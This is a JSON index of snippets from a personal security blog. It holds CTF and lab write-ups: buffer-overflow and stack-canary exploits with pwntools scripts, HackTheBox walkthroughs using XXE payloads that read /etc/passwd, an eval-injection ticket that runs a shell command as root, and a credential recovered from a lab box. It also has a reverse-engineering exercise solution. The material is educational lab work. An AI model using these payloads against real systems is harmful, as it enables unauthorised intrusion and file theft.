[
  
  {
    "title": "PWN Journey - Part 1",
    "url": "/blog/en/posts/pwns-1/",
    "categories": "PWN Journey",
    "tags": "reverse engineer, pwn",
    "date": "2021-12-08 00:00:00 +0800",
    





    "snippet": "ForewordGreetings, this series of posts delves into a collection of pwnie solutions that I have been poking around for a while and finally have the time to publish it so that I could practice my writing and attempt to share some knowledge in such a way that could be helpful to others. Not to mention that I am also a rookie in this field, so take my words with a grain of salt and all critics/suggestions are welcome.Notwithstanding these step-by-step solutions, I still strongly encourage readers to reproduce or alter the challenges in their own way. Moreover, please do keep in mind that the solutions are not being put in any level orders, even the first ones can be much complicated for you to fully digest. With that said, then scratching your head for hours, diving into the basics and bending them to your needs is a minimum requirement to achieve your goal.Anyway, I hope you have a good time learning.Protostar stack0 (reproduced)Goal: Change the value of modified to any but 0.The original challenge can be found here. You should practice this challenge using Protostar VM first since it is built as a 32-bit ELF, much simpler and straightforward.This particular version of stack0, however, is expected to be built and executed on a variety of different architectures, customizations, and such others.Description:This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.Source code:// NOTE: I don&#39;t use the VM provided by Protostar. So I will include my build options within the source.// Build: $ gcc -g stack0.c -o stack0 -no-pie -fno-stack-protector -z execstack// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;int main(int argc, char **argv){  volatile int modified;	// volatile keyword ensures that this variable is not optimized (deleted) by compilers as it is not being used or modified at all  char buffer[64];  modified = 0;  gets(buffer);  if(modified != 0) {      printf(&quot;you have changed the &#39;modified&#39; variable\\n&quot;);  } else {      printf(&quot;Try again?\\n&quot;);  }}You can achieve the goal by triggering a buffer overflow in the gets function since it got flagged unsafe, according to MSDN:SolutionSome of you have thought of inserting 64 random characters into the buffer variable and a random byte to write pass the modified variable itself then congratulation, you are correct… theoretically. If you are exercising the challenge connecting to Protostar VM, it should work properly; otherwise, you might encounter as follows:This happened mostly due to our stack alignment or compiler options being somewhat different from that of Protostar VM.Let us have a closer analysis at the assembly code.Put your focus around these lines:[0x7ffff7fd3050]&amp;gt; s main;pdf            ; DATA XREF from entry0 @ 0x55555555507d┌ 79: int main (int argc, char **argv, char **envp);│           ; var int64_t var_50h @ rbp-0x50│           ; var int64_t var_4h @ rbp-0x4...│           0x555555555154      c745fc000000.  mov dword [var_4h], 0│           0x55555555515b      488d45b0       lea rax, [var_50h]│           0x55555555515f      4889c7         mov rdi, rax│           0x555555555162      b800000000     mov eax, 0│           0x555555555167      e8d4feffff     call sym.imp.gets       ; char *gets(char *s)│           0x55555555516c      8b45fc         mov eax, dword [var_4h]...Based on the code, gets reads a line from STDIN and the size of the buffer can be inferred by subtracting the end address (i.e, rbp-0x50) with  the start address (i.e, rbp-0x4). Hence, buf_size = 0x50 - 0x4 = 0x4c = 76 (decimal).Solve.pyAnd from that we now know how many characters are needed to overflow the buffer, but remember we still have to overwrite the modified variable.So here is our one-liner.$ python -c &#39;print(b&quot;a&quot;*76 + b&quot;modified_val&quot;)&#39; | ./stack0Goal achieved.ret2win (reproduce)Goal: Successfully overwrite the return pointer to execute win().A random 32-bit challenge on the Internet with only its source code provided. Same approach but in 64-bit.// Build: $ gcc source.c -o vuln -no-pie -fno-stack-protector -z execstack// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux#include &amp;lt;stdio.h&amp;gt;void unsafe() {    char buffer[40];        puts(&quot;Overflow me&quot;);    gets(buffer);}void main() {    unsafe();}void flag() {    puts(&quot;Exploited!!!!!&quot;);}Code breakdownThe program calls unsafe(), which contains a buffer overflow vulnerability at the gets with a buffer of 40 bytes. Furthermore, there is a flag() function but it is completely isolated, never to be called and we have to somehow invoke the function.SolutionAs already mentioned, we need to find how many bytes to overflow and reach the return address pointer, thus 40 bytes is not enough. You can imagine our skeleton payload should roughly be as follows:payload = BUF_SIZE (40 bytes) + SOME_JUNK (?? bytes) + FLAG_ADDR (RIP)The BUF_SIZE and SOME_JUNK in combination, there is a generic term for it called padding and we have to determine the padding length before you can overwrite the value of RIP.Let me introduce you to the De Bruijn Sequence, which contains no string of n character repeated. The sequence can either be created by yourself or any available auxiliaries (e.g., ragg2, cyclic, pattern_create (gdb)).The reason why a random gibberish string is able to help us to find the padding is that while you are filling the stack with the sequence, RIP (and even others) could already be overwritten, thereby leading to a SIGSEGV and crashing the execution. With that, the particular position of these so-called random bytes in RIP now is that of our padding length in the sequence pattern.Next, we want to load the binary in our debugger and find the padding length.and our registers table:The wopO `dr rip` command simply finds the given value in RIP into a De Bruijn sequence at a current offset or you can just type wopO 0x41415441 instead and it shows us our padding size, 56.payload = PADDING (56 bytes) + FLAG_ADDR (RIP)We have one last factor, the address of flag() which is 0x0040116b. To get it, simply type afl for a list of functions and their addresses.[0x41415441]&amp;gt; afl0x00401050    1 42           entry00x00401090    4 33   -&amp;gt; 31   sym.deregister_tm_clones0x004010c0    4 49           sym.register_tm_clones0x00401100    3 33   -&amp;gt; 28   sym.__do_global_dtors_aux0x00401130    1 2            entry.init00x004011e0    1 1            sym.__libc_csu_fini0x00401132    1 40           dbg.unsafe0x00401030    1 6            sym.imp.puts0x00401040    1 6            sym.imp.gets0x004011e4    1 9            sym._fini0x00401180    4 93           sym.__libc_csu_init0x00401080    1 1            sym._dl_relocate_static_pie0x0040115a    1 17           dbg.main0x0040116b    1 19           dbg.flag					; THIS ONE0x00401000    3 23           map._home_kali_Desktop_Study_PWN_etc_ret2win_vuln.r_xUsing the built-in grep, radare should have the output optimizedSolve.pyNow that we have the padding length, control RIP and flag() address.Hence, our final solve.py.#!/usr/bin/env python3from pwn import *flag_rip = p64(0x0040116b)	# pack flag_addr: \\x6b\\x11\\x40\\x00padding = asm(shellcraft.nop()) * 56	# 56 bytes of NOPpayload = padding + flag_ripr = process(&#39;./vuln&#39;)r.sendlineafter(b&#39;me\\n&#39;, payload)print(r.clean())Pwnable.kr - bofGoal: Successfully modify the value of key to spawn a shell.This is an original challenge at pwnable.kr.Description:Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.cRunning at : nc pwnable.kr 9000Provided source:#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key){	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme);	// smash me!	if(key == 0xcafebabe){		system(&quot;/bin/sh&quot;);	}	else{		printf(&quot;Nah..\\n&quot;);	}}int main(int argc, char* argv[]){	func(0xdeadbeef);	return 0;}Code breakdownThere are only two function, main and func.main basically calls func with 0xdeadbeef as its sole key argument whose value is to be compared with 0xcafebabe and if true, spawns a shell or, otherwise, prints Nah..\\n. Not to mention the obvious buffer overflow as func creates a 32 bytes buffer then reads it with gets.SolutionSince we are not reproducing the challenge but downloading straight from the source, let us check its properties.Not a fan of radare2? Here is the simplified output from checksec.As it might be seen, the binary has NX, PIE, and canary bit enabled. Especially with stack canary, we are not able to determine the padding length with De Bruijn Sequence anymore. However, other protection bits are neither important nor able to interrupt our payload in this practice at all so I will skip them for now.Therefore, you have to evaluate these offsets manually.First, set a breakpoint after the gets function because the subsequent instruction is the comparison of key and 0xcafebabe.Then locate our buffer offset, which is 0xffef8ffc, apparently.And variable key’s offset, 0xffef9030.Evaluate this expression: 0xffef9030 - 0xffef8ffc = 0x34 = 52 (decimal) &amp;lt;-- padding length.Also, you can try using this shortcut instead of those weary steps.[0x5658662c]&amp;gt;? `pxr 1 @ebp+8 ~[0]` - `dr eax`Hence, our skeleton payload:payload = PADDING (52) + KEY_VALUESolve.pyEither of these should work properly.One-liner: python -c&quot;print(b&#39;a&#39;*52+b&#39;\\xbe\\xba\\xfe\\xca&#39;)&quot; | tee payload &amp;amp;&amp;amp; (cat payload &amp;amp;&amp;amp; cat)| nc pwnable.kr 9000.Pwntools:#!/usr/bin/env python3from pwn import *payload = b&#39;a&#39;*52 + p32(0xcafebabe)if __name__ == &#39;__main__&#39;:	if(sys.argv[1] == &#39;local&#39;):		r = process(&#39;./bof&#39;)	else:		r = remote(&#39;pwnable.kr&#39;, 9000)	r.clean()	r.sendline(payload)	r.interactive()Canary (custom)Goal: Successfully bypass canary and call win().Source:// Build: $ gcc canary.c -o canary -no-pie -fstack-protector -z execstack// The option &quot;-fstack-protector&quot; enables canary// Build target: Linux kali 5.14.0-kali2-amd64 #1 SMP Debian 5.14.9-2kali1 (2021-10-04) x86_64 GNU/Linux#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void vuln() {    char buffer[32];    puts(&quot;Leak me&quot;);    gets(buffer);    printf(buffer);    puts(&quot;&quot;);    puts(&quot;Overflow me&quot;);    gets(buffer);}int main() {    vuln();}void win() {    puts(&quot;You won!&quot;);}This simple challenge ideally demonstrates how we can bypass stack protection, as know as stack canary.But before being able to understand the crucial part, we should get hold of the protection bit first. To put it simply, at the prologue of a function, a random value is place onto the stack and before the program execute ret, the present value of that variable is to be compared with the initial and a ***stack smashing detected*** error message would show up thereafter if they are not the same; otherwise, exit normally.Note: Stack canaries in Linux is a bit more tricky as they end in 00, which will null-terminated any strings in case you make mistakes using print functions. Still, it makes them much easier to spot.Code breakdownThere are three functions: main, vuln and win.win is isolated and main merely calls vuln. vuln, however, reads a buffer of 32 bytes twice, before and after printing it using puts.Solution1. Brute-forcingPlease do remember that this method works exclusively with 32-bit programs and sometimes is the sole solution when there are no leak capabilities. Since it is, unfortunately, not practicable with our particular 64-bit binary, we will discuss the method further at another time.2. Leaking a Stack CanaryThis method aim is to read the value of the canary through a certain format string leakages, such as read, strncpy, puts and printf.A format string bug is a simple, yet, powerful auxiliary which if you can manipulate and leverage it to perform reading or even writing to arbitrary memory regions. Imagine you have a small code snippet as follows:int a = 64;printf(&quot;%x %x %x&quot;, a, a, a);Expected output:40 40 40But supposing we have 3 format identifiers with only a single argument.int a = 64;printf(&quot;%x %x %x&quot;, a);And we get:40 3c27ed48 61879738Not meet the expected amount of arguments, printf simply continues printing the next values on the stack, thus leaking them. Hence, latter 3c27ed48 and 61879738 are probably not our int a = 64 but random junk value on the stack.Let us have a glance at the vulnerable source again.vuln():...	puts(&quot;Leak me&quot;);    gets(buffer);    printf(buffer);    puts(&quot;&quot;);    puts(&quot;Overflow me&quot;);    gets(buffer);...The puts function allows us to leak the canary, we then can use that value to overwrite the canary itself and finally call win() to achieve the initial goal.Now to the most intriguing phase, let us load it in radare2 and in most practical cases, you should first check the protection properties of the binary. It either could be done using checksec or rabin2, whatever comes to your liking.Next, we want to set a breakpoint at the subsequent instruction near the first gets and a second breakpoint around the canary so that we can easily determine our canary offset.Executing the program and hit the first breakpoint at 0x00401163, we are therefrom able to read the canary value. Furthermore, we can calculate the padding length between our buffer and the canary by evaluating 0x50 - 0x8 = 0x48 = 72 (decimal).[0x7f347597b050]&amp;gt; s sym.vuln;pdf┌ 133: sym.vuln ();│           ; var int64_t var_50h @ rbp-0x50	; our 32-byte buffer│           ; var int64_t var_8h @ rbp-0x8		; canary variable...│           0x0040115a      64488b042528.  mov rax, qword fs:[0x28]	; stored canary in RAX│           0x00401163 b    488945f8       mov qword [var_8h], rax	; Breakpoint 1...[0x00401163]&amp;gt; dr rax0xdc9e3a07a36a200[0x00401163]&amp;gt;Our current canary value: 0xdc9e3a07a36a200Then, we need to know how far is it from our buffer offset to the canary’s and in order to do so, let us hit the second breakpoint and read the stack.So the buffer is 15 addresses (or 64 bytes) away from the canary, that is also the reason why %15$p is our input so that puts can print out the special sentinel value.And we successfully get the correct value of the canary.Nevertheless, keep in mind that stack canaries are randomized for every new process, therefore we have to automate the canary leaking procedure as below:#!/usr/bin/env python3from pwn import *r = process(&#39;./canary&#39;)r.sendlineafter(b&#39;Leak me\\n&#39;, b&#39;%15$p&#39;)canary = int(r.recvline(), 16)log.info(&#39;Canary: %s&#39; % hex(canary))And thus far we have had our skeleton payload:payload = PAD_TILL_CANARY (72) + CANARY + PAD_TIL_RIP (??) + WIN_OFFSET (??)In order to calculate PAD_TIL_RIP, let us get back to radare2 and set another breakpoint after the second gets.Stop at the second breakpoint we set earlier, I want you to remember that our current canary offset is at 0x7fffb74f25c0+16 = 0x7fffb74f25d0.Follow the execution flow, we now hit the third breakpoint after gets then we examine the data chunk at 0x7fffb74f25d0.Using ragg2 pattern, we now know the RIP offset is 16 bytes from the canary’s start point, and the canary size is 8 (or 4 in 32-bit) bytes so our PAD_TIL_RIP is 16 - 8 = 8.And the last factor is WIN_OFFSET, you can dump it out either using objdumpor iI~win within radare2.Solve.pyYou finally made it here, congratulation.payload = PAD_TILL_CANARY (72) + CANARY + PAD_TIL_RIP (8) + WIN_OFFSET (0x004011ec)#!/usr/bin/env python3from pwn import *r = process(&#39;./canary&#39;)r.sendlineafter(b&#39;Leak me\\n&#39;, b&#39;%15$p&#39;)canary = int(r.recvline(), 16)log.info(&#39;Canary: %s&#39; % hex(canary))payload = asm(shellcraft.nop()) * 72payload += p64(canary)payload += asm(shellcraft.nop()) * 8 payload += p64(0x004011ec)r.sendlineafter(b&#39;Overflow me\\n&#39;, payload)print(r.clean())"
  },
  
  {
    "title": "HackTheBox - BountyHunter",
    "url": "/blog/en/posts/HTB-BountyHunter/",
    "categories": "hackthebox",
    "tags": "hackthebox, network, pwn, machine",
    "date": "2021-10-03 00:00:00 +0800",
    





    "snippet": "Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series.I hope you have a nice weekend and without further ado, let us jump right in!EnumerationNmap output┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter]└─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct  2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100Nmap scan report for 10.10.11.100Host is up (0.048s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Bounty HuntersService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelBased on nmap result, Apache and SSH service were running on port 80 and 22, respectively.The default index shows no conspicuous detail aside from its portal redirecting to a report form.Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters.ExploitationXML Eternal EntityAs the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look.From here you can tell that the value of data field is encoded, so I prefer using  CyberChef, a powerful yet simple utility, to analyze and decode it.Our recipe consists of URL Decode and From Base64, sequentially.The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input.You can read more about XXE here.Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the /etc/passwd on the server.&amp;lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [  &amp;lt;!ELEMENT foo ANY &amp;gt;  &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &amp;gt;]&amp;gt;		&amp;lt;bugreport&amp;gt;		&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;		&amp;lt;cwe&amp;gt;x&amp;lt;/cwe&amp;gt;		&amp;lt;cvss&amp;gt;x&amp;lt;/cvss&amp;gt;		&amp;lt;reward&amp;gt;aaaa&amp;gt;&amp;lt;/reward&amp;gt;		&amp;lt;/bugreport&amp;gt;And the return is:In case the expect:// module is available on the target server then you can craft your payload as below and actually get RCE.&amp;lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [  &amp;lt;!ELEMENT foo ANY &amp;gt;  &amp;lt;!ENTITY xxe SYSTEM &quot;expect://ls&quot; &amp;gt;]&amp;gt; &amp;lt;!-- execute &quot;ls&quot; command --&amp;gt;		&amp;lt;bugreport&amp;gt;		&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;		&amp;lt;cwe&amp;gt;x&amp;lt;/cwe&amp;gt;		&amp;lt;cvss&amp;gt;x&amp;lt;/cvss&amp;gt;		&amp;lt;reward&amp;gt;aaaa&amp;gt;&amp;lt;/reward&amp;gt;		&amp;lt;/bugreport&amp;gt;Unfortunately, the result is just four empty fields, which indicates that expect:// is not loaded or this is a blind injection. Not really matter, though.We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already used it in one of my university challenges.So our new payload is as following:&amp;lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [  &amp;lt;!ELEMENT foo ANY &amp;gt;  &amp;lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot; &amp;gt;]&amp;gt;		&amp;lt;bugreport&amp;gt;		&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;		&amp;lt;cwe&amp;gt;x&amp;lt;/cwe&amp;gt;		&amp;lt;cvss&amp;gt;x&amp;lt;/cvss&amp;gt;		&amp;lt;reward&amp;gt;aaaa&amp;gt;&amp;lt;/reward&amp;gt;		&amp;lt;/bugreport&amp;gt;It reads and encodes index.php on the server to a base64 string.Yet it is just some HTML and CSS, nothing special so I have gobuster enumerating .php and other sensitive extensions.After retrieving db.php and decoding the content, we have some credentials.But neither test nor admin was a valid username for SSH login, so I try looking for another user with console on the server system by searching for /bin/bash or /home/(username) in the /etc/passwd file.There are just root and Development.Credentials spraying with CMEIn this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, user.txt and pass.txt).And the valid credentials are: development:m19RoAU0hP41A1sTsq6K.Privilege EscalationTo know whether development user is capable of executing command as superuser or not, try $ sudo -l:development@bountyhunter:~$ sudo -lMatching Defaults entries for development on    bountyhunter:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser development may run the following commands on        bountyhunter:    (root) NOPASSWD: /usr/bin/python3.8        /opt/skytrain_inc/ticketValidator.pyAs can be seen, development can execute /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py as root without password.Eval() == EvilReading /opt/skytrain_inc/ticketValidator.py source.#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc):    if loc.endswith(&quot;.md&quot;):        return open(loc, &#39;r&#39;)    else:        print(&quot;Wrong file type.&quot;)        exit()def evaluate(ticketFile):    #Evaluates a ticket to check for ireggularities.    code_line = None    for i,x in enumerate(ticketFile.readlines()):        if i == 0:            if not x.startswith(&quot;# Skytrain Inc&quot;):                return False            continue        if i == 1:            if not x.startswith(&quot;## Ticket to &quot;):                return False            print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;)            continue        if x.startswith(&quot;__Ticket Code:__&quot;):            code_line = i+1            continue        if code_line and i == code_line:            if not x.startswith(&quot;**&quot;):                return False            ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0]            if int(ticketCode) % 7 == 4:                validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;))                if validationNumber &amp;gt; 100:                    return True                else:                    return False    return Falsedef main():    fileName = input(&quot;Please enter the path to the ticket file.\\n&quot;)    ticket = load_file(fileName)    #DEBUG print(ticket)    result = evaluate(ticket)    if (result):        print(&quot;Valid ticket.&quot;)    else:        print(&quot;Invalid ticket.&quot;)    ticket.closemain()Code breakdown:load_file checks whether the file extension is .md or not.evaluate  returns False whether the first line doesn’t start with # Skytrain Inc or ## Ticket to; otherwise, prints the destination and continues.  reads the string below “__Ticket Code:__”, removes (**) and thereafter assigns the number before the (+) operator asticketCode.  Executes the following string as code whether the modulo of ticketCode and 7 is 4.Hence, our root_ticket.md: Skytrain Inc## Ticket to New Haven__Ticket Code:__**32+100 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;)##Issued: 2021/10/03#End Ticket"
  },
  
  {
    "title": "HackTheBox - Cap",
    "url": "/blog/en/posts/HTB-Cap/",
    "categories": "hackthebox",
    "tags": "hackthebox, network, pwn, machine",
    "date": "2021-10-01 00:00:00 +0800",
    





    "snippet": "Hello everyone, while preparing chapters of the book Practical Reverse Engineering, I occasionally got bored and wanted to do something else to have my mind a reboot. That is the reason why we are here solving Cap - another HackTheBox easy machine.So yeah, hope you enjoy.EnumerationAs usual, we wanted to start our enumeration step with nmap.┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/Cap]└─$ cat nmap/Cap.nmap# Nmap 7.91 scan initiated Thu Sep 30 21:54:00 2021 as: nmap -sS -sV -sC -p- -oA nmap/Cap 10.10.10.245Nmap scan report for 10.10.10.245Host is up (0.054s latency).Not shown: 65532 closed portsPORT   STATE SERVICE VERSION21/tcp open  ftp     vsftpd 3.0.322/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)80/tcp open  http    gunicorn| fingerprint-strings: 	...|_http-server-header: gunicorn|_http-title: Security DashboardService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Sep 30 21:56:34 2021 -- 1 IP address (1 host up) scanned in 153.60 seconds                                   The output was simplified as we just needed to focus on those SSH, FTP and HTTP service ports. I also tried enumerating them with CrackMapExec but nothing was found since neither their SSH nor FTP was any low-hanging fruit at all.ExploitationFrom PCAP to user accessVisiting the webpage gave us a small hint about the username.The top-left dropdown provided us with three features and only the second, Security Snapshot Analysis, that I considered abusable whereas the other two were just outputs from ifconfig.The second option redirected the user to an endpoint of downloadable Wireshark data separated by IDs: http://10.10.10.245/data/[ID].With this type of situation, let’s have dirb doing its job.$ dirb http://10.10.10.245/data/ /usr/share/wordlists/dirb/common.txtAnd we got expected result:Except 0.pcap from http://10.10.10.245/data/0 or 00, all data of other IDs seemed to be empty.After downloading, we could inspect the .PCAP file with Wireshark.┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/Cap]└─$ wireshark 0.pcap&amp;amp;Scrolled down a little around FTP protocol then you would be able to grab our user’s credentials.With the newly found username and password, let’s try logging in to the remote target via SSH and FTP.Same credentials also worked for SSH.You can see that someone else had been here before us and dropped their enumeration script (linpeas.sh) here. Since sudo -l is not allowed for user nathan, I also started a LinPEAS instance and streamed it back to my Linux.Privilege EscalationThe script resulted with an infamous python3.8 capability vector.Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks./usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eipOn account of the cap_setuid capability, one can temporarily execute a program/file with dedicated privilege. In our case, I spawned a shell with root id and was then able to read the final flag."
  },
  
  {
    "title": "PRE Solutions Series: First Chapter",
    "url": "/blog/en/posts/PRE-C1-E1/",
    "categories": "Practical-Reverse-Engineering",
    "tags": "reverse engineer, Practical Reverse Engineering, On-going",
    "date": "2021-07-05 00:00:00 +0800",
    





    "snippet": "As promised, this is the beginning of our solutions for the book Practical Reverse Engineering I had mentioned earlier. The utmost objective is to solve and provide concrete explanations for each topic.The target audiences are believed to:  Be familiar with basic mid-level programming language  Have at least a fundamental understanding of computer architecture (CPU, RAM, etc.)  Be determined to learn and do exercises in the bookAnd please be noticed that all of these solutions here are explained in my own comprehension and experience as there may have been some miscalculations and inaccuracies therein; hence, readers are recommended to review and reproduce these solutions if possible.Without further ado, I hope you enjoy the post.Basic conceptsBefore going any deeper, we have to understand initial concepts about registers, data types, and calling conventions. The book has already covered these definitions in a much more detailed version; it is nonetheless worth going through the vital parts again.The explanations will be provided in x86 flavor first, then in x64 or ARM to make it easier for beginners.General Purpose RegistersIn protected mode, where virtual memory and paging are supported, the x86 architecture has eight 32-bit general-purpose-registers (GPRs): EAX, EBX, EDX, ECX, EDI, ESI, EBP, ESP. And some can be further divided into 8- and 16-bit registers such as AX, AL, SI, DI,....The following table presents common GPRs and their general usages:            Register      Purpose                  ECX      Loop counter              EDI      String-destination operations              ESI      String-source operations              EBP      Base frame pointer              ESP      Stack pointer              EAX, EBX, EDX      Computing operations or storing data      Data typesAs you may already know,  there are common data types such as int, unsigned char, long, or variable classifications in general. Each of them has a specific size in the memory, which we can evaluate using the sizeof operator (ex. sizeof(int) results in 4). This is also applied to our assembly registers without any significant difference.            Data-type      Size      Register                  Byte      8 bits      AL, CL, BL              Word      16 bits      AX, BX, CX              Double Word      32 bits      EAX, EBX, ECX              Quad Word      64 bits      EDX:EAX      Speaking in x86, Qword is not available on this architecture but it can combine two 32-bit registers, usually EDX:EAX, to contain a 64-bit value in some scenarios.Calling conventionsIn C/C++, we have seen some common calling conventions: __cdecl, __stdcall or __fastcall. These so-called conventions are multiple sets of rules dictating how function calls work at the machine level. For example, should parameters be passed through the stack or registers? And should they be passed in left-to-right or right-to-left order?                   CDECL      STDCALL      FASTCALL                  Parameters      right-to-left      right-to-left      right-to-left              Stack      Caller must clean up the stack after call      Callee must clean up the stack after call      Besides the first two parameters, all are on the stack.              Return      Stored in EAX      Stored in EAX      Stored in EAX      Exercise 1 - Page 11Below is our assignment.  This function uses a combination SCAS and STOS to do its work. First, explain what is the type of [EBP+8] and [EBP+C] in line 1 and 8, respectively. Next explain what this snippet does.01: 8B 7D 08    mov edi, [ebp+8]02: 8B D7       mov edx, edi03: 33 C0       xor eax, eax04: 83 C9 FF    or ecx, 0FFFFFFFFh05: F2 AE       repne scasb06: 83 C1 02    add ecx, 207: F7 D9       neg ecx08: 8A 45 0C    mov al, [ebp+0Ch]09: 8B AA       mov edi, edx10: F3 AA       rep stosb11: 8B C2       mov eax, edx[ebp+8] and [ebp+0C] are the first and second parameters in the code snippet, respectively. It is assured because the convention will put our parameters on the stack before the CALL instruction is executed.The types of [ebp+8] and [ebp+C] are most likely to be determined by the destination registers. In line 1, it is shown that the first parameter [ebp+8] is stored in EDI, which is commonly used in string operations and yet in line 8, the 8-bit register AL stores our second parameter[ebp+C] as a single byte value, ergo:  [ebp+8] is of type char* or null-terminated string  [ebp+C] is of type char or a single byte letterSnippet walkthrough01: 8B 7D 08    mov edi, [ebp+8]Simply copy the first parameter into EDI from the stack.02: 8B D7       mov edx, ediMake a copy of EDI into EDX.03: 33 C0       xor eax, eaxThis operation sets EAX to zero.04: 83 C9 FF    or ecx, 0FFFFFFFFhSets ECX to 0xFFFFFFFF or, basically, -1 in decimal.05: F2 AE       repne scasbREPNE SCASB instruction repeatedly scans and compares the byte of the accumulator (i.e. EAX) against the present value pointed at by EDI. It also decreases the counter ECX and increases EDI by one each in comparison.In simple terms, the mentioned instruction searches for the NUL character in our string buffer. Please do remember that ECX contains the length of our string plus two (incl. the NUL byte and an uninitialized/unknown element after it) in negative form. For instance, if our string was 100 characters in length, ECX would be -102.06: 83 C1 02    add ecx, 2Add 2 to ECX and thus equal to the length of our string in the negative (incl. the NUL character).07: F7 D9       neg ecxNegates the value of ECX, so it is two’s complement negation. ECX = -(-100) = 100.08: 8A 45 0C    mov al, [ebp+0Ch]Copy the second parameter to AL register.09: 8B AA       mov edi, edxAs EDI was modified (increased in line 5), thereafter the register no longer points at the string buffer. Thus, this resets EDI with the copied version of itself, EDX, in line 2 so that it can be used again in the following line.10: F3 AA       rep stosbSTOSB is mostly the same as SCASB except that it writes the value of the accumulator (i.e. AL), repeatedly ECX times, to EDI. On that account, line 10 instruction replaces our entire buffer with the value of the second parameter.11: 8B C2       mov eax, edxEAX is now holding the address of our modified string buffer.Pseudo-C codeThe following snippet demonstrates the function.char * exercise1_page11(char * param1, char param2) {  // get the length of param1  int len = strlen(param1);  // replace each character in the buffer with param2  memset(param1, param2, len);  return param1;}"
  },
  
  {
    "title": "Update.txt",
    "url": "/blog/en/posts/Update-Note/",
    "categories": "Thoughts",
    "tags": "content, miscs",
    "date": "2021-07-01 00:00:00 +0800",
    





